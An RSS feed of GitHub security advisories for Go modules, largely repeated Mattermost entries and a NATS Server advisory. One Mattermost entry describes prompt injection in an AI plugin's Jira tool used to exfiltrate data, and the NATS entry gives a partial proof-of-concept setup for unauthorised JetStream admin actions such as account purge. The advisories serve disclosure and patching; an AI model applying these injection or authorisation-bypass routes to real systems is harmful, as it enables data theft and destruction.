<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-04-16T18:01:35.165Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost doesn't restrict domains LLM can request to contact upstream]]></title>
        <id>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</id>
        <link href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84"/>
        <updated>2025-04-16T15:15:49.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.4.x &lt;= 10.4.2, 10.5.x &lt;= 10.5.0, 9.11.x &lt;= 9.11.9 fail to restrict domains the LLM can request to contact upstream&nbsp;which allows an authenticated user to&nbsp;exfiltrate data from an arbitrary server accessible to the victim via performing a prompt injection&nbsp;in the AI plugin's Jira tool.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31363">https://nvd.nist.gov/vuln/detail/CVE-2025-31363</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84">https://github.com/advisories/GHSA-9h6j-4ffx-cm84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T12:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost doesn't restrict domains LLM can request to contact upstream]]></title>
        <id>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</id>
        <link href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84"/>
        <updated>2025-04-16T15:15:49.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.4.x &lt;= 10.4.2, 10.5.x &lt;= 10.5.0, 9.11.x &lt;= 9.11.9 fail to restrict domains the LLM can request to contact upstream&nbsp;which allows an authenticated user to&nbsp;exfiltrate data from an arbitrary server accessible to the victim via performing a prompt injection&nbsp;in the AI plugin's Jira tool.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31363">https://nvd.nist.gov/vuln/detail/CVE-2025-31363</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84">https://github.com/advisories/GHSA-9h6j-4ffx-cm84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T12:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost doesn't restrict domains LLM can request to contact upstream]]></title>
        <id>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</id>
        <link href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84"/>
        <updated>2025-04-16T15:15:49.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.4.x &lt;= 10.4.2, 10.5.x &lt;= 10.5.0, 9.11.x &lt;= 9.11.9 fail to restrict domains the LLM can request to contact upstream&nbsp;which allows an authenticated user to&nbsp;exfiltrate data from an arbitrary server accessible to the victim via performing a prompt injection&nbsp;in the AI plugin's Jira tool.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31363">https://nvd.nist.gov/vuln/detail/CVE-2025-31363</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84">https://github.com/advisories/GHSA-9h6j-4ffx-cm84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T12:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost doesn't restrict domains LLM can request to contact upstream]]></title>
        <id>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</id>
        <link href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84"/>
        <updated>2025-04-16T15:15:49.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.4.x &lt;= 10.4.2, 10.5.x &lt;= 10.5.0, 9.11.x &lt;= 9.11.9 fail to restrict domains the LLM can request to contact upstream&nbsp;which allows an authenticated user to&nbsp;exfiltrate data from an arbitrary server accessible to the victim via performing a prompt injection&nbsp;in the AI plugin's Jira tool.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-31363">https://nvd.nist.gov/vuln/detail/CVE-2025-31363</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-9h6j-4ffx-cm84">https://github.com/advisories/GHSA-9h6j-4ffx-cm84</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9h6j-4ffx-cm84</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T12:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</id>
        <link href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7"/>
        <updated>2025-04-16T15:07:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the "Allow Users to View Archived Channels" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27571">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to Observable Timing Discrepancy]]></title>
        <id>https://github.com/advisories/GHSA-2j87-p623-8cc2</id>
        <link href="https://github.com/advisories/GHSA-2j87-p623-8cc2"/>
        <updated>2025-04-16T15:06:38.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Plugin MSTeams versions &lt;2.1.0 and Mattermost Server&nbsp;versions 10.5.x &lt;=10.5.1 with the MS Teams plugin enabled fail to perform constant time comparison on a MSTeams plugin webhook secret which allows&nbsp;an attacker to retrieve the webhook secret of the MSTeams plugin via a timing attack during webhook secret comparison.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27936">https://nvd.nist.gov/vuln/detail/CVE-2025-27936</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-2j87-p623-8cc2">https://github.com/advisories/GHSA-2j87-p623-8cc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2j87-p623-8cc2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T12:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-j639-m367-75cf</id>
        <link href="https://github.com/advisories/GHSA-j639-m367-75cf"/>
        <updated>2025-04-16T15:05:54.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24839">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-j639-m367-75cf">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j639-m367-75cf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Missing Authentication for Critical Function]]></title>
        <id>https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</id>
        <link href="https://github.com/advisories/GHSA-j5jw-m2ph-3jjf"/>
        <updated>2025-04-16T15:04:17.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 9.11.x &lt;= 9.11.9 fail to enforce MFA checks in PUT /api/v4/users/user-id/mfa when the requesting user differs from the target user ID, which allows users with edit_other_users permission to activate or deactivate MFA for other users, even if those users have not set up MFA.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27538">https://nvd.nist.gov/vuln/detail/CVE-2025-27538</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-j5jw-m2ph-3jjf">https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost-plugin-msteams] Mattermost vulnerable to Observable Timing Discrepancy]]></title>
        <id>https://github.com/advisories/GHSA-2j87-p623-8cc2</id>
        <link href="https://github.com/advisories/GHSA-2j87-p623-8cc2"/>
        <updated>2025-04-16T15:06:38.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Plugin MSTeams versions &lt;2.1.0 and Mattermost Server&nbsp;versions 10.5.x &lt;=10.5.1 with the MS Teams plugin enabled fail to perform constant time comparison on a MSTeams plugin webhook secret which allows&nbsp;an attacker to retrieve the webhook secret of the MSTeams plugin via a timing attack during webhook secret comparison.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27936">https://nvd.nist.gov/vuln/detail/CVE-2025-27936</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-2j87-p623-8cc2">https://github.com/advisories/GHSA-2j87-p623-8cc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2j87-p623-8cc2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T12:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to Observable Timing Discrepancy]]></title>
        <id>https://github.com/advisories/GHSA-2j87-p623-8cc2</id>
        <link href="https://github.com/advisories/GHSA-2j87-p623-8cc2"/>
        <updated>2025-04-16T15:06:38.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost Plugin MSTeams versions &lt;2.1.0 and Mattermost Server&nbsp;versions 10.5.x &lt;=10.5.1 with the MS Teams plugin enabled fail to perform constant time comparison on a MSTeams plugin webhook secret which allows&nbsp;an attacker to retrieve the webhook secret of the MSTeams plugin via a timing attack during webhook secret comparison.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27936">https://nvd.nist.gov/vuln/detail/CVE-2025-27936</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-2j87-p623-8cc2">https://github.com/advisories/GHSA-2j87-p623-8cc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2j87-p623-8cc2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T12:31:19.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</id>
        <link href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7"/>
        <updated>2025-04-16T15:07:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the "Allow Users to View Archived Channels" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27571">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</id>
        <link href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7"/>
        <updated>2025-04-16T15:07:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the "Allow Users to View Archived Channels" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27571">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</id>
        <link href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7"/>
        <updated>2025-04-16T15:07:04.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to check the "Allow Users to View Archived Channels" configuration when fetching channel metadata of a post from archived channels, which allows authenticated users to access such information when a channel is archived.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27571">https://nvd.nist.gov/vuln/detail/CVE-2025-27571</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-h4rr-f37j-4hh7">https://github.com/advisories/GHSA-h4rr-f37j-4hh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h4rr-f37j-4hh7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Missing Authentication for Critical Function]]></title>
        <id>https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</id>
        <link href="https://github.com/advisories/GHSA-j5jw-m2ph-3jjf"/>
        <updated>2025-04-16T15:04:17.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 9.11.x &lt;= 9.11.9 fail to enforce MFA checks in PUT /api/v4/users/user-id/mfa when the requesting user differs from the target user ID, which allows users with edit_other_users permission to activate or deactivate MFA for other users, even if those users have not set up MFA.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27538">https://nvd.nist.gov/vuln/detail/CVE-2025-27538</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-j5jw-m2ph-3jjf">https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Missing Authentication for Critical Function]]></title>
        <id>https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</id>
        <link href="https://github.com/advisories/GHSA-j5jw-m2ph-3jjf"/>
        <updated>2025-04-16T15:04:17.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 9.11.x &lt;= 9.11.9 fail to enforce MFA checks in PUT /api/v4/users/user-id/mfa when the requesting user differs from the target user ID, which allows users with edit_other_users permission to activate or deactivate MFA for other users, even if those users have not set up MFA.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27538">https://nvd.nist.gov/vuln/detail/CVE-2025-27538</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-j5jw-m2ph-3jjf">https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j5jw-m2ph-3jjf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-j639-m367-75cf</id>
        <link href="https://github.com/advisories/GHSA-j639-m367-75cf"/>
        <updated>2025-04-16T15:05:54.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24839">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-j639-m367-75cf">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j639-m367-75cf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-j639-m367-75cf</id>
        <link href="https://github.com/advisories/GHSA-j639-m367-75cf"/>
        <updated>2025-04-16T15:05:54.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24839">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-j639-m367-75cf">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j639-m367-75cf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-j639-m367-75cf</id>
        <link href="https://github.com/advisories/GHSA-j639-m367-75cf"/>
        <updated>2025-04-16T15:05:54.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to prevent Wrangler posts from triggering AI responses. This vulnerability allows users without access to the AI bot to activate it by attaching the activate_ai override property to a post via the Wrangler plugin, provided both the AI and Wrangler plugins are enabled.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24839">https://nvd.nist.gov/vuln/detail/CVE-2025-24839</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-j639-m367-75cf">https://github.com/advisories/GHSA-j639-m367-75cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j639-m367-75cf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-04-16T09:32:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/nats-io/nats-server/v2] NATS Server may fail to authorize certain Jetstream admin APIs]]></title>
        <id>https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</id>
        <link href="https://github.com/advisories/GHSA-fhg8-qxh5-7q3w"/>
        <updated>2025-04-16T13:12:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="advisory">Advisory</h2>
<p>The management of JetStream assets happens with messages in the <code>$JS.</code> subject namespace in the system account; this is partially exposed into regular accounts to allow account holders to manage their assets.</p>
<p>Some of the JS API requests were missing access controls, allowing any user with JS management permissions in any account to perform certain administrative actions on any JS asset in any other account. At least one of the unprotected APIs allows for data destruction. None of the affected APIs allow disclosing stream contents.</p>
<h3 id="affected-versions">Affected versions</h3>
<p>NATS Server:</p>
<ul>
<li>Version 2 from v2.2.0 onwards, prior to v2.11.1 or v2.10.27</li>
</ul>
<hr>
<h2 id="original-report">Original Report</h2>
<p>(Lightly edited to confirm some supposition and in the summary to use past tense)</p>
<h3 id="summary">Summary</h3>
<p>nats-server did not include authorization checks on 4 separate admin-level JetStream APIs: account purge, server remove,  account stream move, and  account stream cancel-move.</p>
<p>In all cases, APIs are not properly restricted to system-account users. Instead, <em>any</em> authorized user can execute the APIs, including across account boundaries, as long as the current user merely has permission to publish on <code>$JS.&gt;</code>.</p>
<p>Only the first seems to be of highest severity. All are included in this single report as they seem likely to have the same underlying root cause.</p>
<p>Reproduction of the <code>ACCOUNT.PURGE</code> case is below. The others are like it.</p>
<h3 id="details--impact">Details &amp; Impact</h3>
<h4 id="issue-1-jsapiaccountpurge">Issue 1: <code>$JS.API.ACCOUNT.PURGE.*</code></h4>
<p>Any user may perform an account purge of any other account (including their own).</p>
<p>Risk: total destruction of Jetstream configuration and data.</p>
<h4 id="issue-2-jsapiserverremove">Issue 2: <code>$JS.API.SERVER.REMOVE</code></h4>
<p>Any user may remove servers from Jetstream clusters.</p>
<p>Risk: Loss of data redundancy, reduction of service quality.</p>
<h4 id="issue-3-jsapiaccountstreammove-and-cancel_move">Issue 3: <code>$JS.API.ACCOUNT.STREAM.MOVE.*.*</code> and <code>CANCEL_MOVE</code></h4>
<p>Any user may cause streams to be moved between servers.</p>
<p>Risk: loss of control of data provenance, reduced service quality during move, enumeration of account and/or stream names.</p>
<p>Similarly for <code>$JS.API.ACCOUNT.STREAM.CANCEL_MOVE.*.*</code></p>
<h4 id="mitigations">Mitigations</h4>
<p>It appears that users without permission to publish on <code>$JS.API.ACCOUNT.&gt;</code> or <code>$JS.API.SERVER.&gt;</code> are unable to execute the above APIs.</p>
<p>Unfortunately, in many configurations, an 'admin' user for a single account will be given permissions for <code>$JS.&gt;</code> (or simply <code>&gt;</code>), which allows the improper access to the system APIs above.</p>
<h4 id="scope-of-impact">Scope of impact</h4>
<p>Issues 1 and 3 both cross boundaries between accounts, violating promised account isolation. All 3 allow system level access to non-system account users.</p>
<p>While I cannot speak to what authz configurations are actually found in the wild, per the discussion in Mitigations above, it seems likely that at least some configurations are vulnerable.</p>
<h4 id="additional-notes">Additional notes</h4>
<p>It appears that <code>$JS.API.META.LEADER.STEPDOWN</code> does properly restrict to system account users. As such, this may be a pattern for how to properly authorize these other APIs.</p>
<h3 id="poc">PoC</h3>
<h4 id="environment">Environment</h4>
<p>Tested with:
nats-server 2.10.26 (installed via homebrew)
nats cli 0.1.6 (installed via homebrew)
macOS 13.7.4</p>
<h4 id="reproduction-steps">Reproduction steps</h4>
<pre><code>$ nats-server --version
nats-server: v2.10.26

$ nats --version
0.1.6

$ cat nats-server.conf
listen: '0.0.0.0:4233'
jetstream: {
  store_dir: './tmp'
}
accounts: {
  '$SYS': {
    users: [{user: 'sys', password: 'sys'}]
  },
  'TEST': {
    jetstream: true,
    users: [{user: 'a', password: 'a'}]
  },
  'TEST2': {
    jetstream: true,
    users: [{user: 'b', password: 'b'}]
  }
}

$ nats-server -c ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.494663 [INF] Using configuration file: ./nats-server.conf
...
[90608] 2025/03/02 11:43:18.496395 [INF] Listening for client connections on 0.0.0.0:4233
...

# Authentication is effectively enabled by the server:
$ nats -s nats://localhost:4233 account info
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user sys --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user a --password wrong
nats: error: setup failed: nats: Authorization Violation

$ nats -s nats://localhost:4233 account info --user b --password wrong
nats: error: setup failed: nats: Authorization Violation

# Valid credentials work, and users properly matched to accounts:
$ nats -s nats://localhost:4233 account info --user sys --password sys
Account Information
                      User: sys
                   Account: $SYS
...

$ nats -s nats://localhost:4233 account info --user a --password a
Account Information
                           User: a
                        Account: TEST
...

$ nats -s nats://localhost:4233 account info --user b --password b
Account Information
                           User: b
                        Account: TEST2
...

# Add a stream and messages to account TEST (user 'a'):
$ nats -s nats://localhost:4233 --user a --password a stream add stream1 --subjects s1 --storage file --defaults
Stream stream1 was created
...

$ nats -s nats://localhost:4233 --user a --password a publish s1 --count 3 "msg {{Count}}"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"
11:50:05 Published 5 bytes to "s1"

# Messages are correctly persisted on account TEST, and not on TEST2:
$ nats -s nats://localhost:4233 --user a --password a stream ls
╭───────────────────────────────────────────────────────────────────────────────╮
│                                    Streams                                    │
├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤
│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │
├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤
│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │
